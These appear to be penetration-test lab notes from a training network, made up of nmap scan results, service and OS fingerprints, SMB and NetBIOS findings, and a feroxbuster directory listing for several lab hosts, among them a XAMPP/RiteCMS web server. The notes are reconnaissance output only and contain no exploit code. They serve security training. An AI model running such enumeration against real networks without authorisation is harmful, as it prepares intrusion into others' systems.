| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAluDjuAj1IWA7VJKrkzfbdTpqJGHXKIjrBoAA
| 5fPn2ZvEodOn+9L8M/VdYJjCvqYLTvD/EnXqbU5uJFmumtQb04r2VcwTmwnVxYjy
| Us0p/yzUKdVa5j0s5kb69i9+RRX6qn2xvjxXzVchtLmfvQxaxG+A5vowVlYsU1Pu
| Z8loPkdKt3/8IN6AqkHM7kkFHzlsnPuV3g+B0l4db/eMvU45lO54zIY8BXnLShNE
| ZdGHAuzWUEdL7lJWEUdvR+PEFJRhfa6eorFRxW3H8xwtu4EJOs2dB1MNDvy7EQkr
| nCNm9VU6MsYmAbfjpBN8W36rq5g1rCtcMb8DQ56YMdVbZsbZEQIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBAB+RFDqxBRHjIuKI9AysxSRFZX+H44TDXbbw2zzg8Cg7XLZOeykr7+gNn4ZZ
| xFEynnMkM+8sK+PcpUE4cvIjTh68etEXit1ADO9bWp2+9E3QZolSFNuG5C9vFFCK
| gJcbjszj8xwZ3QDsq6fr2ZSVuTkYIh5FIym07aSNS9O26r5/v3ur7LzbRDBS6t/m
| DYlG3NvqM0mlgqZLgqKSkmBzjruVCYY+4XujqRVGIYXgCMfOGb47amsw2qHMjM11
| 8Ic5BvXfb3e5wIZ+GuwrOd9yf21r1Ql31VG9c04PBv8nDGx39t+dwn5K9dVi9DVg
| Aol7JyhaP4kboL+qZYIIX4Wc0sM=
|_-----END CERTIFICATE-----
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): IBM z/OS 1.11.X (85%)
OS CPE: cpe:/o:ibm:zos:1.11
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: IBM z/OS 1.11 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/28%OT=135%CT=%CU=%PV=Y%G=N%TM=68AFF14F%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10E%TI=I%CI=I%TS=A)
SEQ(SP=104%GCD=1%ISR=10C%TI=I%CI=I%II=RI%TS=A)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

Uptime guess: 0.731 days (since Wed Aug 27 08:31:39 2025)
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incrementing by 2
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-28T06:03:19
|_  start_date: N/A
| nbstat: NetBIOS name: WK02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:2d:03 (VMware)
| Names:
|   WK02<20>             Flags: <unique><active>
|   WK02<00>             Flags: <unique><active>
|   RELIA<00>            Flags: <group><active>
| Statistics:
|   00:50:56:ab:2d:03:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 12607/tcp): CLEAN (Timeout)
|   Check 2 (port 24536/tcp): CLEAN (Timeout)
|   Check 3 (port 50852/udp): CLEAN (Timeout)
|   Check 4 (port 34705/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
```
## 19 (??)
### portscan
```
Open 172.16.119.19:22
```
### port details
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:62:4a:de:a5:b4:f1:2a:5a:f3:a1:d8:d3:96:1b:8d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG4jf10ZuWPnEsmqxv9XExNgdd+ehcSaBEwBSQiS7leR1yk2Jti3+YG2kaYvVEYXPfuOkBR27MJoLbqo7LBgt3U=
|   256 f2:94:b5:71:88:a1:f8:c5:d9:47:77:6b:07:ae:27:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKozyldN+VTxMu+2OHndElEKoTVXgBFfOfqPgkCJ97Pp
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/28%OT=22%CT=%CU=%PV=Y%G=N%TM=68AFF1A9%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=109%TI=RD%CI=I%II=RI%TS=A)
SEQ(SP=105%GCD=1%ISR=107%TI=I%CI=I%II=RI%TS=A)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

Uptime guess: 20.919 days (since Thu Aug  7 04:01:36 2025)
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incrementing by 2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## 20 (??)
### portscan
```
Open 172.16.119.20:22
```
### port details
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   256 c8:3a:f1:c9:e1:9c:31:2d:9d:26:df:c7:c5:21:d8:e3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDa1L06nvUFVKPp/2ZRpL5re0Q2lT17lYleYcedhFvEXfQRy9dy3G5q0ChKTWK5Xzwf0Scxrj5eSegHkJ0fmZDI=
|   256 f6:79:92:a4:06:56:38:e3:ca:15:91:a8:dc:94:44:2c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMaP7tuofi7br3rowLfpqRhQG0FpiFx7c4vhs0Wsx26P
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/28%OT=22%CT=%CU=%PV=Y%G=N%TM=68AFF22F%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=RI%TS=A)
SEQ(SP=FF%GCD=1%ISR=110%TI=I%CI=I%II=RI%TS=A)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

Uptime guess: 21.564 days (since Wed Aug  6 12:35:10 2025)
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: Incrementing by 2
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```
## 21 (FILES)
### portscan
```
Open 172.16.119.21:139
Open 172.16.119.21:135
Open 172.16.119.21:445
Open 172.16.119.21:49672
Open 172.16.119.21:49665
Open 172.16.119.21:49664
Open 172.16.119.21:49666
Open 172.16.119.21:49668
Open 172.16.119.21:49667
Open 172.16.119.21:49669
```
### port details
```
PORT      STATE SERVICE       REASON         VERSION
135/tcp   open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 64
49664/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/28%OT=135%CT=%CU=%PV=Y%G=N%TM=68AFF2F6%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=108%TI=I%CI=I%II=RI%TS=A)
SEQ(SP=108%GCD=1%ISR=10B%TI=I%CI=I%II=RI%TS=A)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

Uptime guess: 24.933 days (since Sun Aug  3 03:47:54 2025)
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incrementing by 2
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: FILES, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:b1:83 (VMware)
| Names:
|   FILES<00>            Flags: <unique><active>
|   RELIA<00>            Flags: <group><active>
|   FILES<20>            Flags: <unique><active>
| Statistics:
|   00:50:56:ab:b1:83:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2025-08-28T06:10:22
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25389/tcp): CLEAN (Timeout)
|   Check 2 (port 16763/tcp): CLEAN (Timeout)
|   Check 3 (port 29564/udp): CLEAN (Timeout)
|   Check 4 (port 17205/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
## 30 (WEBBY)
### portscan
```
Open 172.16.119.30:80
Open 172.16.119.30:139
Open 172.16.119.30:135
Open 172.16.119.30:445
Open 172.16.119.30:47001
Open 172.16.119.30:49667
Open 172.16.119.30:49670
Open 172.16.119.30:49669
Open 172.16.119.30:49664
Open 172.16.119.30:49668
Open 172.16.119.30:49666
Open 172.16.119.30:49665
```

### port details
```
PORT      STATE SERVICE       REASON         VERSION
80/tcp    open  http          syn-ack ttl 64 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Anna Test Machine
135/tcp   open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 64
47001/tcp open  http          syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/28%OT=80%CT=%CU=%PV=Y%G=N%TM=68AFF39A%P=x86_64-pc-linux-gnu)
SEQ(SP=108%GCD=1%ISR=10C%TI=I%CI=I%II=RI%TS=A)
SEQ(SP=108%GCD=1%ISR=10D%TI=I%CI=I%II=RI%TS=A)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

Uptime guess: 31.091 days (since Mon Jul 28 00:02:10 2025)
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Incrementing by 2
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26469/tcp): CLEAN (Timeout)
|   Check 2 (port 59632/tcp): CLEAN (Timeout)
|   Check 3 (port 50442/udp): CLEAN (Timeout)
|   Check 4 (port 43778/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: WEBBY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:db:6d (VMware)
| Names:
|   WEBBY<20>            Flags: <unique><active>
|   WEBBY<00>            Flags: <unique><active>
|   RELIA<00>            Flags: <group><active>
| Statistics:
|   00:50:56:ab:db:6d:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2025-08-28T06:13:06
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 0s
```

# DMZ
## 249 LEGACY
### open ports
```
Open 192.168.102.249:80
Open 192.168.102.249:135
Open 192.168.102.249:139
Open 192.168.102.249:445
Open 192.168.102.249:3389
Open 192.168.102.249:5985
Open 192.168.102.249:8000
Open 192.168.102.249:47001
Open 192.168.102.249:49664
Open 192.168.102.249:49665
Open 192.168.102.249:49666
Open 192.168.102.249:49667
Open 192.168.102.249:49669
Open 192.168.102.249:49670
Open 192.168.102.249:49668
```
### port details
```
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LEGACY
|   NetBIOS_Domain_Name: LEGACY
|   NetBIOS_Computer_Name: LEGACY
|   DNS_Domain_Name: LEGACY
|   DNS_Computer_Name: LEGACY
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-18T15:07:55+00:00
| ssl-cert: Subject: commonName=LEGACY
| Issuer: commonName=LEGACY
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-17T15:04:08
| Not valid after:  2026-02-16T15:04:08
| MD5:   3da2:36ec:fcb2:8692:f2e6:72d5:627f:14e0
| SHA-1: 408b:8830:8245:9c6b:4440:ad98:3f8c:632a:5718:7974
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQZJuEbVYS5IdIe8Vy/a9PzDANBgkqhkiG9w0BAQsFADAR
| MQ8wDQYDVQQDEwZMRUdBQ1kwHhcNMjUwODE3MTUwNDA4WhcNMjYwMjE2MTUwNDA4
| WjARMQ8wDQYDVQQDEwZMRUdBQ1kwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQCqz6M0RqUSz8qLutZWZmJU8xYW5nfrT5IDJuc/Uwe9MVi3RDkkL/8VbExi
| ZlrWjiyyYYSNmxy6h/RnlbpClT9k2lrDXMA8O2cvIHupyzZ8xz9ReNobhRlazHqx
| EYGQ5OBVXCTiClRLz8KwG8Xe8Vx1Ixjg2FMwgblbQKVI6sbOxdVd6T5wzs5TcdTp
| 1deQCcZ1xSIAn1jovRlZcEU1xUValTGGFB7AVtVDMBp69nhtJOxhr/uH421SetU3
| f5LLNda3Np8TSmFMP6KKtTjKezC9qUZTPWnoTwa3nS6KMMRIKjVDj7ff6G+SEWGA
| 7YxyqTGxa6vUkXK2GR6RPb7l/y9hAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEABNrppxfmm0xOJgiy
| F7Z9p/07M0Xj89iUlPE5ccIOyDk5k6Ikqd2L7BKvvYIKMcbfULoM1Tj/QuvEf6bc
| /nFBuKvisKs2VyVa0YIAFvhelO51gIXk8NXMbLV6VyOf5wcQLJKcm9bGu6SwLuHs
| oLypq+cqo36POh8ka1PYl3hqu+0g8V2mtGCS/L10HMueh7BJJRZmozEjSffR09Vt
| +JOvzAW5LF5+59WQBQSLVk/BcLMfFM5pHBv0hbwROMEY/uHfZ+WNToD9uWkfMgJV
| myg6LLnR9UY2Wj4k73uInci+UkJwwWwFJnGf8bmexYERiBEtjBxV4lfblDhwwDNk
| 2T63ZA==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-08-18T15:08:03+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          syn-ack ttl 125 Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.102.249:8000/dashboard/
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 1607 (90%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Microsoft Windows 10 1703 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/18%OT=80%CT=%CU=32117%PV=Y%DS=4%DC=T%G=N%TM=68A341D3%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10C%TI=I%CI=I%TS=A)
SEQ(SP=108%GCD=1%ISR=10A%TI=RD%CI=I)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)

Uptime guess: 0.000 days (since Mon Aug 18 11:07:51 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18025/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 33881/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 35884/udp): CLEAN (Failed to receive data)
|   Check 4 (port 28997/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2025-08-18T15:07:55
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

### feroxbuster 8000
```
http://192.168.146.249:8000/img/module_table_top.png
http://192.168.146.249:8000/img/module_table_bottom.png
http://192.168.146.249:8000/cms/templates/plain.tpl
http://192.168.146.249:8000/cms/templates/mobile.tpl
http://192.168.146.249:8000/cms/templates/style.css
http://192.168.146.249:8000/cms/templates/photo.tpl
http://192.168.146.249:8000/cms/templates/sitemap.tpl
http://192.168.146.249:8000/cms/templates/default.tpl
http://192.168.146.249:8000/cms/templates/common.css
http://192.168.146.249:8000/cms/templates/mobile.css
http://192.168.146.249:8000/cms/templates/photo.css
http://192.168.146.249:8000/cms/templates/editor.css
http://192.168.146.249:8000/cms/templates/mobile-old.css
http://192.168.146.249:8000/cms/templates/rss.tpl
http://192.168.146.249:8000/cms/cms/
http://192.168.146.249:8000/cms/Templates/plain.tpl
http://192.168.146.249:8000/cms/Templates/photo.css
http://192.168.146.249:8000/cms/Templates/style.css
http://192.168.146.249:8000/cms/Templates/photo.tpl
http://192.168.146.249:8000/cms/Templates/mobile.css
http://192.168.146.249:8000/cms/Templates/default.tpl
http://192.168.146.249:8000/cms/Templates/mobile.tpl
http://192.168.146.249:8000/cms/Templates/rss.tpl
http://192.168.146.249:8000/cms/Templates/mobile-old.css
http://192.168.146.249:8000/cms/Templates/common.css
http://192.168.146.249:8000/cms/Templates/editor.css
http://192.168.146.249:8000/cms/Templates/sitemap.tpl
http://192.168.146.249:8000/cms/files/
http://192.168.146.249:8000/cms/templates/images/ritecms-powered.png
http://192.168.146.249:8000/dashboard/images/social-icons.png
http://192.168.146.249:8000/dashboard/images/fastly-logo@2x.png
http://192.168.146.249:8000/dashboard/images/fastly-logo.png
http://192.168.146.249:8000/dashboard/images/xampp-logo.svg
http://192.168.146.249:8000/dashboard/images/bitnami-xampp.png
http://192.168.146.249:8000/dashboard/images/xampp-newsletter-logo.png
http://192.168.146.249:8000/dashboard/images/linux-logo.png
http://192.168.146.249:8000/dashboard/images/middleman.png
http://192.168.146.249:8000/dashboard/images/social-icons-large.png
http://192.168.146.249:8000/dashboard/images/twitter-bird.png
http://192.168.146.249:8000/dashboard/docs/backup-restore-mysql.pdfmarks
http://192.168.146.249:8000/dashboard/docs/configure-vhosts.pdfmarks
http://192.168.146.249:8000/dashboard/docs/troubleshoot-apache.html
http://192.168.146.249:8000/dashboard/docs/deploy-git-app.pdfmarks
http://192.168.146.249:8000/dashboard/docs/use-php-fcgi.pdfmarks
http://192.168.146.249:8000/dashboard/docs/create-framework-project-zf1.html
http://192.168.146.249:8000/dashboard/docs/transfer-files-ftp.pdfmarks
http://192.168.146.249:8000/dashboard/docs/create-framework-project-zf1.pdfmarks
http://192.168.146.249:8000/dashboard/docs/increase-php-file-upload-limit.html
http://192.168.146.249:8000/dashboard/docs/change-mysql-temp-dir.html
http://192.168.146.249:8000/dashboard/docs/change-mysql-temp-dir.pdf
http://192.168.146.249:8000/dashboard/docs/send-mail.html
http://192.168.146.249:8000/dashboard/docs/transfer-files-ftp.html
http://192.168.146.249:8000/dashboard/docs/configure-vhosts.html
http://192.168.146.249:8000/dashboard/docs/use-different-php-version.pdfmarks
http://192.168.146.249:8000/dashboard/docs/use-sqlite.html
http://192.168.146.249:8000/dashboard/docs/use-sqlite.pdfmarks
http://192.168.146.249:8000/dashboard/docs/send-mail.pdfmarks
http://192.168.146.249:8000/dashboard/docs/configure-use-tomcat.pdfmarks
http://192.168.146.249:8000/dashboard/docs/install-wordpress.html
http://192.168.146.249:8000/dashboard/docs/use-sqlite.pdf
http://192.168.146.249:8000/dashboard/docs/use-php-fcgi.html
http://192.168.146.249:8000/dashboard/docs/create-framework-project-zf2.pdfmarks
http://192.168.146.249:8000/dashboard/docs/deploy-git-app.html
http://192.168.146.249:8000/dashboard/docs/access-phpmyadmin-remotely.pdf
http://192.168.146.249:8000/dashboard/docs/configure-vhosts.pdf
